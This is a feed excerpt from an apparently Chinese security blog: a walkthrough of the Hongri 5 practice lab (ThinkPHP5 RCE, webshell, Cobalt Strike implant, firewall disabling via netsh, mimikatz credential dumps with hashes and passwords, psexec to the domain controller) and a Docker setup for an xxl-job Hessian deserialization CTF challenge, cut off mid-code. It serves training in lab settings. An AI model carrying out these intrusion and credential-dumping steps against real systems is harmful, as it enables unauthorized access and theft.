    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;跟着官方环境来，但是具体上又有点出入，所以记录一下详细步骤，官方文档：&lt;a href=&quot;https://www.yuque.</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场五</title>
    <link href="https://clowsman.github.io/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/"/>
    <id>https://clowsman.github.io/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/</id>
    <published>2024-11-20T17:01:38.000Z</published>
    <updated>2024-11-21T10:36:53.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>虚拟机密码</strong></p><p><strong>win7</strong></p><p>sun\heart 123.com</p><p>sun\Administrator dc123.com（因为过期了，改成Admin12345）</p><p><strong>2008</strong></p><p>sun\admin 2020.com（改成2022.com）</p><p>Win7双网卡模拟内外网</p><p>仅主机模式网卡：192.168.138.0</p><p>NAT模式网卡：192.168.135.0</p><p>配置好后需要进入win7主机将phpstudy服务开起来</p><p><img src="https://cdn.clown2024.cn/image-20241121125028618.png" alt="image-20241121125028618"></p><p>emmm试了一下又是不能ping通的，但是网页能正常访问</p><h1 id="考点思路"><a href="#考点思路" class="headerlink" title="考点思路"></a>考点思路</h1><p><strong>一、环境搭建</strong></p><ul><li><p>1.环境搭建测试</p></li><li><p>2.信息收集</p></li></ul><p><strong>二、漏洞利用</strong></p><ul><li><p>3.漏洞搜索与利用</p></li><li><p>4.漏洞利用Getshell</p></li><li><p>5.系统信息收集</p></li><li><p>6.主机密码收集</p></li></ul><p><strong>三、内网搜集</strong></p><ul><li><p>7.内网–继续信息收集</p></li><li><p>8.内网攻击姿势–MS14-058</p></li><li><p>9.内网攻击姿势–MS17-010</p></li></ul><p><strong>四、横向移动</strong></p><ul><li><p>10.psexec远控</p></li><li><p>11.内网其它主机端口</p></li><li><p>12.netsh增删防火墙规则</p></li></ul><p><strong>五、构建通道</strong></p><ul><li>13.内网其它主机端口-代理转发</li></ul><p><strong>六、持久控制</strong></p><ul><li><p>14.域渗透-域成员信息收集</p></li><li><p>15.域渗透-基础服务弱口令探测及深度利用之powershell</p></li><li><p>16.域渗透-横向移动[wmi利用]</p></li><li><p>17.域渗透-域控实现与利用</p></li></ul><p><strong>七、痕迹清理</strong></p><ul><li>18、日志清理</li></ul><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>先arp-scan -l看一下存活主机</p><p><img src="https://cdn.clown2024.cn/image-20241121125732100.png" alt="image-20241121125732100"></p><p>拿到web服务器地址：192.168.135.150</p><p>做一下端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sS -v 192.168.135.150<br></code></pre></td></tr></table></figure><p>扫出来两个端口信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PORT     STATE SERVICE<br>80/tcp   open  http<br>3306/tcp open  mysql<br></code></pre></td></tr></table></figure><p>然后fscan扫出来一个135端口开放，但是我的fscan漏洞探测不了不知道为什么，我们手动去看一下</p><p><img src="https://cdn.clown2024.cn/image-20241121130427924.png" alt="image-20241121130427924"></p><p>访问一下80端口的服务可以看到是一个thinkphp5的服务</p><p><img src="https://cdn.clown2024.cn/image-20241121125627193.png" alt="image-20241121125627193"></p><p>用工具：<a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3%E6%88%96%E8%80%85https://github.com/bewhale/thinkphp_gui_tools%E7%9C%8B%E7%9C%8B%E8%83%BD%E4%B8%8D%E8%83%BD%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%9C%80%E5%A5%BD%E4%BD%BF%E7%94%A8java8%E6%9D%A5%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E5%8E%BBOracle%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AAjava8%E7%9A%84jdk">https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3或者https://github.com/bewhale/thinkphp_gui_tools看看能不能一把梭，不过最好使用java8来运行，这里可以去Oracle下载一个java8的jdk</a></p><p><img src="https://cdn.clown2024.cn/image-20241121132256316.png" alt="image-20241121132256316"></p><p>解压</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">tar -xzvf jdk-8u401-linux-x64.tar.gz <br></code></pre></td></tr></table></figure><blockquote><p>有点男泵，这台kali一直说我超内存，我换了一台kali就可以了</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241121161223838.png" alt="image-20241121161223838"></p><p>可以看到扫出了四个洞了，这下可以一把梭了</p><p>选择对应poc执行一下</p><p><img src="https://cdn.clown2024.cn/image-20241121161320128.png" alt="image-20241121161320128"></p><p>发现可以成功，那这时候就直接getshell蚁剑连一下</p><p><img src="https://cdn.clown2024.cn/image-20241121162241375.png" alt="image-20241121162241375"></p><p><img src="https://cdn.clown2024.cn/image-20241121162256002.png" alt="image-20241121162256002"></p><p>成功连接</p><p>不过为了方便上传cs马这里还是上传一个冰蝎马来连接</p><p><img src="https://cdn.clown2024.cn/image-20241121163421297.png" alt="image-20241121163421297"></p><p>然后关一下防火墙先</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121163742545.png" alt="image-20241121163742545"></p><p>然后上传一个cs的木马</p><p><img src="https://cdn.clown2024.cn/image-20241121164338443.png" alt="image-20241121164338443"></p><p>然后运行</p><p><img src="https://cdn.clown2024.cn/image-20241121164413507.png" alt="image-20241121164413507"></p><p>可以看到主机成功上线</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>常规net view看一下主机</p><p><img src="https://cdn.clown2024.cn/image-20241121164636888.png" alt="image-20241121164636888"></p><p>可以看到域控的地址为：192.168.138.138</p><p>然后mimikatz进行logonpasswords拿一下密码信息</p><p><img src="https://cdn.clown2024.cn/image-20241121164833388.png" alt="image-20241121164833388"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Authentication Id : 0 ; 151193 (00000000:00024e99)<br>Session           : Interactive from 1<br>User Name         : Administrator<br>Domain            : SUN<br>Logon Server      : DC<br>Logon Time        : 2024/11/21 12:44:44<br>SID               : S-1-5-21-3388020223-1982701712-4030140183-500<br>msv :<br> [00000003] Primary<br> * Username : Administrator<br> * Domain   : SUN<br> * LM       : ac804745ee68ebea48116059303a4365<br> * NTLM     : ccef208c6485269c20db2cad21734fe7<br> * SHA1     : 58d1a25c09f4ee98209941b2b333fbe477d472a9<br>tspkg :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>wdigest :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>kerberos :<br> * Username : Administrator<br> * Domain   : SUN.COM<br> * Password : Admin12345<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 997 (00000000:000003e5)<br>Session           : Service from 0<br>User Name         : LOCAL SERVICE<br>Domain            : NT AUTHORITY<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-19<br>msv :<br>tspkg :<br>wdigest :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>kerberos :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 996 (00000000:000003e4)<br>Session           : Service from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-20<br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 46807 (00000000:0000b6d7)<br>Session           : UndefinedLogonType from 0<br>User Name         : (null)<br>Domain            : (null)<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : <br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 999 (00000000:000003e7)<br>Session           : UndefinedLogonType from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-18<br>msv :<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br></code></pre></td></tr></table></figure><p>管理员密码相关的信息我们也已经找到了</p><p>用户哈希也拿一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>heart:1000:aad3b435b51404eeaad3b435b51404ee:a34efdd63a23abea4413ba73cafa5a30:::<br></code></pre></td></tr></table></figure><h2 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h2><p>接下来就是要拿下域控了</p><p>既然都拿到hash了那就直接psexec横向移动一把梭了</p><p>建立一个smb监听器</p><p><img src="https://cdn.clown2024.cn/image-20241121171441969.png" alt="image-20241121171441969"></p><p>然后直接jump psexec</p><p><img src="https://cdn.clown2024.cn/image-20241121171456605.png" alt="image-20241121171456605"></p><p>成功上线</p><p><img src="https://cdn.clown2024.cn/image-20241121171531530.png" alt="image-20241121171531530"></p><p><img src="https://cdn.clown2024.cn/image-20241121171543198.png" alt="image-20241121171543198"></p><p>psexec能一把梭主要还是DC主机开了$ADMIN共享管道</p><p><img src="https://cdn.clown2024.cn/image-20241121172048305.png" alt="image-20241121172048305"></p><p>这台靶机比前面的简单挺多的</p><p>其实应该win7靶机用普通用户登录才对，这样我们才需要提权</p><p>查找提权漏洞的话我们可以用systeminfo保存下系统信息，然后用wesng工具来搜索</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python wes.py sysinfo.txt --impact <span class="hljs-string">&quot;Elevation of Privilege&quot;</span><br><span class="hljs-comment">#--impact指定漏洞类型为提权漏洞</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121183215773.png" alt="image-20241121183215773"></p><p>然后就可以找到各种漏洞信息了</p><p>exp漏洞库：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;虚拟机密码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win7&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;sun</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DASCtf-easyjob</title>
    <link href="https://clowsman.github.io/2024/11/18/DASCtf-easyjob/"/>
    <id>https://clowsman.github.io/2024/11/18/DASCtf-easyjob/</id>
    <published>2024-11-18T11:57:35.000Z</published>
    <updated>2024-11-28T10:34:00.056Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>由于题目是公共靶机现在已经挂了，所以复现需要自己搭建题目环境</p><p>跟着这篇文章来配置一下：<a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p>主要是admin组件的配置，因为他是一个war，需要部署在tomcat上，executor是springboot应用，直接java -jar就行了</p><p><strong>mysql配置</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启动数据库</span><br>docker run -itd --name xxl-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.6.40<br><span class="hljs-comment"># 复制sql到容器中</span><br>docker <span class="hljs-built_in">cp</span> &lt;xxl-job的sql文件&gt; xxl-mysql:/tmp<br><span class="hljs-comment"># 进入容器连接数据库</span><br>mysql -uroot -p123456<br><span class="hljs-comment"># 执行命令导入数据库</span><br><span class="hljs-built_in">source</span> /tmp/tables_xxl_job.sql<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119102349324.png" alt="image-20241119102349324"></p><p>然后本地编译一下xxl-job的admin项目，我们需要他war包解压后的文件夹，配置文件需要修改一下，xxl.job.db.password属性改成刚刚的数据库的密码</p><p>然后写一个dockerfile构建tomcat服务</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br></code></pre></td></tr></table></figure><p>构建镜像</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker build -t xxl-admin:0.1 .<br></code></pre></td></tr></table></figure><p>启动镜像</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -itd --name xxl-admin -p 8080:8080 xxl-admin:0.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119105306668.png" alt="image-20241119105306668"></p><p>然后本地编译xxl-job-executor-sample-springboot执行器，这个和题目的是一样的，修改配置文件的xxl.job.admin.addresses为<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p><p>然后直接java -jar就能跑起来了</p><p><img src="https://cdn.clown2024.cn/image-20241119105551883.png" alt="image-20241119105551883"></p><p>我们的执行器也上线了</p><p><img src="https://cdn.clown2024.cn/image-20241119105718265.png" alt="image-20241119105718265"></p><h2 id="docker-compose搭建"><a href="#docker-compose搭建" class="headerlink" title="docker-compose搭建"></a>docker-compose搭建</h2><p>想自己试试docker-compose搭建，没有怎么搭建过多容器的应用，但是浪费了好多时间啊实在是，太折磨了</p><p>先给一个总的docker-compose.yaml</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">admin:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./admin</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:8080&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">executor:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./executor</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">executor</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9999:9999&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">mysql</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3306:3306&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>    <span class="hljs-attr">command:</span> <span class="hljs-string">--default-authentication-plugin=mysql_native_password</span> <span class="hljs-comment">#解决外部无法访问</span><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">xxl-job-network:</span><br></code></pre></td></tr></table></figure><p><strong>启动mysql的dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/mysql:<span class="hljs-number">5.7</span><br><span class="hljs-comment"># 设置环境变量，设置 MySQL 的 root 密码</span><br><span class="hljs-keyword">ENV</span> MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span><br><br><span class="hljs-comment"># 将 XXL-Job 的 SQL 脚本复制到容器中的 /tmp 目录</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./tables_xxl_job.sql /tmp/</span><br><span class="hljs-comment"># 复制到docker-entrypoint-initdb.d中</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /tmp/*.sql /docker-entrypoint-initdb.d</span><br><br><span class="hljs-comment"># 将 XXL-Job 的 SQL 脚本复制到容器中的 /docker-entrypoint-initdb.d 目录，MySQL 官方镜像的一个特性：任何放在 /docker-entrypoint-initdb.d/ 目录下的 .sql 文件都会在 MySQL 服务启动时自动执行。</span><br><br><span class="hljs-keyword">ENV</span> LANG=C.UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>然后我想着参考vulhub里的2.2版本的xxl-job环境来进行搭建，但是在maven编译的时候总会出错，我只能采取本地先编译然后再将jar包之类的直接放入</p><p><strong>admin的dockerfile</strong></p><p>编译好之后将解压的war包目录放在dockerfile的上下文目录中</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br></code></pre></td></tr></table></figure><p>编译前需要改一下配置，我们连接数据库采用服务名的方式在docker-compose中，xxl.job.db.url改成如下：</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.db.url</span>=<span class="hljs-string">jdbc:mysql://db:3306/xxl-job?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false</span><br></code></pre></td></tr></table></figure><blockquote><p>这里要注意一个坑，在mysql5.7以上连接数据库是需要配置useSSL&#x3D;false或者true这个选项的，不然连接的时候会一直bad handshake，被坑了好久在这里😭</p></blockquote><p><strong>最后是executor的dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>u272-jre<br><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;clown&quot;</span></span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-executor-sample-springboot-1.9.2.jar /usr/src/xxl-job-executor-sample-springboot-1.9.2.jar</span><br><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /usr/src</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>, <span class="hljs-string">&quot;/usr/src/xxl-job-executor-sample-springboot-1.9.2.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>这里也是先编译好然后放到dockerfile的上下文中</p><p>同样需要修改一下配置，将xxl.job.admin.addresses改成如下：</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.admin.addresses</span>=<span class="hljs-string">http://admin:8080/</span><br></code></pre></td></tr></table></figure><p>我的文件结构如下：</p><p><img src="https://cdn.clown2024.cn/image-20241119152118108.png" alt="image-20241119152118108"></p><p>里面混杂着一些没用的文件问题不大，都是失败的试验品😭</p><p>最后</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker compose up -d<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119152217714.png" alt="image-20241119152217714"></p><p><img src="https://cdn.clown2024.cn/image-20241119152237897.png" alt="image-20241119152237897"></p><p>成功启动！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/PeterJXL/p/18415349">https://www.cnblogs.com/PeterJXL/p/18415349</a></p><p><a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p><a href="https://blog.csdn.net/lichaohao_10/article/details/127445796">https://blog.csdn.net/lichaohao_10/article/details/127445796</a></p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>因为这题涉及到了Hessian原生反序列化，刚好还有一种方式没看，这里就顺便简单学习一下</p><h2 id="hessian的tosting异常反序列化"><a href="#Hessian的toSting异常反序列化" class="headerlink" title="Hessian的toSting异常反序列化"></a>Hessian的toSting异常反序列化</h2><p>原理是字符串和对象拼接导致隐式触发了该对象的toString方法，该漏洞有一个cve，CVE-2021-43297</p><p>这个CVE针对的是Hessian2Input#expect，Hessian1则没有对应的问题。</p><h3 id="利用关键"><a href="#利用关键" class="headerlink" title="利用关键"></a>利用关键</h3><p>我们可以看一下expect的写法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span 